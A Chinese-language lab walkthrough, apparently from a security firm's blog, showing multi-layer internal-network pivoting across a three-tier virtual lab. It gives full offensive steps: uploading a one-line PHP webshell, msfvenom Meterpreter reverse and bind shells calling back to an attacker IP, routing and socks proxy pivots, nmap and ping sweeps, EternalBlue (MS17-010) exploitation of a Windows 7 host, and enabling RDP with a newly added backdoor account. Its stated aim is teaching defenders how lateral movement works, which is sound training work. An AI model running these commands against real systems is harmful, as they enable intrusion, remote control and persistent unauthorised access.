近年来，攻击者潜伏在企业内网进行攻击的安全事件屡见不鲜，攻击者在经常会企业的内网进行横向渗透，令防守方防不胜防。因此，我们应该严格控制好网络区域之间的访问规则，加大攻击横向渗透的阻力。本文由锦行科技的安全研究团队提供，旨在通过实验演示进一步了解攻击者是如何在多层内网进行的渗透。

## 实验简介

网络拓扑图![](https://image.3001.net/images/20210608/1623139629_60bf252d8b04c40357485.jpg!small)

渗透机：win10+kali

第一层靶机 (外网web服务器): Linux

第二场靶机 (内网web服务器): Linux

第三层靶机 (内网办公机) : win7

用三层网络来模拟内外网环境,主要了解MSF、内网转发等。

## 环境搭建

### 第一层网络

把渗透机kali和win10网卡1设置选择VMnet1：

![](https://image.3001.net/images/20210608/1623139676_60bf255cc29ef8cb85e95.jpg!small)

靶机Linux网卡1设置选择VMnet1，添加网卡2 设置选择VMnet2：

![](https://image.3001.net/images/20210608/1623139692_60bf256c3cc6938aa4fd3.jpg!small)

### 第二层网络

将第二台靶机Linux网卡1设置选择VMnet2，添加网卡2
设置选择VMnet3：![](https://image.3001.net/images/20210608/1623139714_60bf25821adb012716ed3.png!small)

### 第三层网络

将靶机win7网卡1设置选择VMnet3：![](https://image.3001.net/images/20210608/1623139738_60bf259a3e5c3e57af619.png!small)

再配置好各台机器对应IP即可。

最后

在第一台Linux和第二台Linux上搭建一个php上传页面，设为存在文件上传漏洞的web页面，以便后续的拿shell进行内网渗透。

第一台Linux

![](https://image.3001.net/images/20210608/1623139766_60bf25b6ce3b771032fd6.png!small)

第二台Linux![](https://image.3001.net/images/20210608/1623139785_60bf25c97bccda7446653.png!small)

  

## 实验过程

### 第一层靶机

win10访问http://192.168.85.131/直接上传一句话木马![](https://image.3001.net/images/20210608/1623139812_60bf25e4e8b099da15113.png!small)

![](https://image.3001.net/images/20210608/1623139830_60bf25f68c8e09de9b2f6.png!small)

![](https://image.3001.net/images/20210608/1623140795_60bf29bb96c7aedafab78.png!small)

蚁剑连接![](https://image.3001.net/images/20210608/1623140813_60bf29cd81099de384a68.png!small)

*进一步做内网渗透，上传msf后门*

打开kali msfconsole 输入msfvenom -p linux/x64/meterpreter/reverse_tcp
LHOST=192.168.85.128 LPORT=4444 -f elf > mshell.elf

生成一个名为mshell.elf的msf后门文件![](https://image.3001.net/images/20210608/1623140836_60bf29e432a99d719cc37.png!small)

蚁剑把后门文件上传到Linux靶机![](https://image.3001.net/images/20210608/1623140860_60bf29fcca54fe820ba90.png!small)

返回msf 开启监听

use exploit/multi/handler 使用监听模块

set payload linux/x64/meterpreter/reverse_tcp 使用和木马相同的payload

set lhost 192.168.85.128 kaili 的ip

set lport 4444 木马的端口

run
执行![](https://image.3001.net/images/20210608/1623140889_60bf2a195cc8be7d543d3.png!small)

蚁剑打开虚拟终端cd到后门文件的目录下,执行后门文件，输入

chmod 777 mshell.elf 加执行权限

./mshell.elf 执行文件

![](https://image.3001.net/images/20210608/1623140915_60bf2a33c1f9ef5287d59.png!small)

Kail接受到MSF会话![](https://image.3001.net/images/20210608/1623140938_60bf2a4a2df7d9e86cb90.png!small)

输入ifconfig，发现第二层172.10.10.0/24网段

![](https://image.3001.net/images/20210609/1623226782_60c0799e3b3f277b79c4b.png!small)

添加路由

background 将会话转到后台

route add 172.10.10.0/24 1

添加 172.10.10.0/24网段 使用session1

route print 查看路由表

![](https://image.3001.net/images/20210609/1623226816_60c079c03de6c291046b0.png!small)

使用MSF建立socks代理

use auxiliary/server/socks4a

set srvhost 192.168.85.128

set srvport 10080

run

![](https://image.3001.net/images/20210609/1623226841_60c079d90aece1f3d4cf6.png!small)

配置socks4代理的相关客户端Proxychains

在配置文件/etc/proxychains.conf中添加：

socks4 192.168.85.128 10080

vi /etc/proxychains.conf

![](https://image.3001.net/images/20210609/1623226864_60c079f0691232b428684.png!small)

添加socks4 192.168.85.128 10080

![](https://image.3001.net/images/20210609/1623226879_60c079ff49424adf3a729.png!small)

这样利用proxychains启动的应用都可以带sock4代理，proxychains 为kali自带的，非MSF里的。

*建立好代理后渗透机可以通过这台Linux当跳板机进入第二层网络*

### 第二层网络

 ***nmap探测存在web服务的主机***

用proxychans启动nmap对第二层网段进行80端口扫描，执行proxychains nmap -sT -Pn -p 80
172.10.10.0/24

![](https://image.3001.net/images/20210609/1623226925_60c07a2ddb2a07b2ce941.png!small)

扫描发现55和56存在web服务,172.10.10.56即为第二层网络的ip

![](https://image.3001.net/images/20210609/1623226942_60c07a3e4efb833c7e291.png!small)

由于proxychains无法代理icmp的数据包，所以必须添加-sT -Pn参数,即不检测主机是否存活,直接进行端口tcp扫描。

 ***脚本探测存活主机***

在本地创建一个名为ping.sh的脚本，脚本内容如下：

#!/bin/bash

ip="172.10.10."

echo "ping log:" > ./ping.txt

for i in {1..254}

do

ping -c 1 -w 1 -W 1 $ip$i | grep -q "ttl=" && echo "$ip$i [yes]" >> ./ping.txt
|| echo "$ip$i [no]" >> ./ping.txt &

done

echo "wait 5s...."

sleep 5

cat ./ping.txt

cat ./ping.txt | wc -l

![](https://image.3001.net/images/20210609/1623226966_60c07a56ba0d9811a723c.png!small)

  

Kali进入session1会话，然后upload命令上传刚刚创建的脚本到靶机upload /root/ping.sh
/var/www/hrml/upload

![](https://image.3001.net/images/20210609/1623226985_60c07a69d1fd2e81aa454.png!small)

进入shell执行

python -c 'import pty;pty.spawn("/bin/bash")'

创建一个完全交互式shell，后

Chmod 777 ping.sh

./ping.sh

可以看到172.10.10.0/24网段存活56.57两台

![](https://image.3001.net/images/20210609/1623227040_60c07aa07be5504bce8c4.png!small)

 ***知道存活主机ip后就可以继续进入第二层内网主机***

渗透机浏览器配置sock4a代理

![](https://image.3001.net/images/20210609/1623227054_60c07aae823fc1600946f.png!small)![](https://image.3001.net/images/20210609/1623227075_60c07ac3b241eb679d125.png!small)

蚁剑加代理连接

![](https://image.3001.net/images/20210609/1623227088_60c07ad0560be6d248a10.png!small)

连接 http://172.10.10.56/upload/php1.php

![](https://image.3001.net/images/20210609/1623227102_60c07ade0d96810d0a31a.png!small)

 ***进一步做内网渗透，继续上传msf后门***

 ***制作MSF后门***

返回kali msf 输入

msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4455 -f elf > mshell1.elf

生成 mshell1.elf后门文件

![](https://image.3001.net/images/20210609/1623227144_60c07b08c01b55f30487f.png!small)

因为在内网跨网段时无法反向代理连接到渗透的机器，所以这里使用linux/x64/meterpreter/bind_tcp
这个payload进行正向代理连接。

蚁剑上传后门

![](https://image.3001.net/images/20210609/1623227166_60c07b1e5ab8a52c6e362.png!small)![](https://image.3001.net/images/20210609/1623227183_60c07b2f6e9bd0a6fdaf1.png!small)

蚁剑打开虚拟终端执行后门文件

![](https://image.3001.net/images/20210609/1623227202_60c07b424c49ff8a66d9f.png!small)

返回会话

![](https://image.3001.net/images/20210609/1623227218_60c07b522cc950c8a10ff.png!small)

输入ifconfig 发现第三层网络的网段10.10.10.0/24

![](https://image.3001.net/images/20210609/1623227235_60c07b6332abd786a8ea9.png!small)

### 第三层网络

添加路由

background

route add 10.10.10.0/24 2

route print

![](https://image.3001.net/images/20210609/1623227250_60c07b72c02dea4d99ddb.png!small)

进入session 2 上传 脚本 探测存活主机

注意把脚本的ip段修改成该网段再上传

![](https://image.3001.net/images/20210609/1623227269_60c07b852a6d1d6db7c19.png!small)

探测到第三层网段的存活ip ：10.10.10.101

![](https://image.3001.net/images/20210609/1623227283_60c07b937031440f24abf.png!small)

proxychans 启动nmap对10.10.10.101的1-500端口扫描，执行

proxychains nmap -sT -Pn -p 1-500 10.10.10.101

![](https://image.3001.net/images/20210609/1623227296_60c07ba0cd78456b2a35d.png!small)

发现445端口开启

![](https://image.3001.net/images/20210609/1623227311_60c07baf95c6c52db7c7e.png!small)

尝试使用ms17-010

use windows/smb/ms17_010_eternalblue

set rhost 10.10.10.101

set payload windows/x64/meterpreter/bind_tcp

set lport 4466

![](https://image.3001.net/images/20210609/1623227327_60c07bbf557e31b1d41c4.png!small)

Run ，存在445漏洞

![](https://image.3001.net/images/20210609/1623227360_60c07be002b220ebbacba.png!small)

执行成功，返回会话

![](https://image.3001.net/images/20210609/1623227376_60c07bf0eba1ff08edf71.png!small)

开启3389远程桌面

run post/windows/manage/enable_rdp 开启远程桌面

run post/windows/manage/enable_rdp USERNAME=zzy PASSWORD=123qwe!@# 添加远程用户

![](https://image.3001.net/images/20210609/1623227400_60c07c08bc89f5e6389d7.png!small)

将3389端口转回kali本地5555端口

portfwd add -l 5555 -p 3389 -r 10.10.10.101

![](https://image.3001.net/images/20210609/1623227420_60c07c1c226ab5a0721e4.png!small)

Win10远程桌面连接

![](https://image.3001.net/images/20210609/1623227434_60c07c2a7768e99170a32.png!small)

登陆成功

![](https://image.3001.net/images/20210609/1623227447_60c07c37c0d67bc3a9165.png!small)

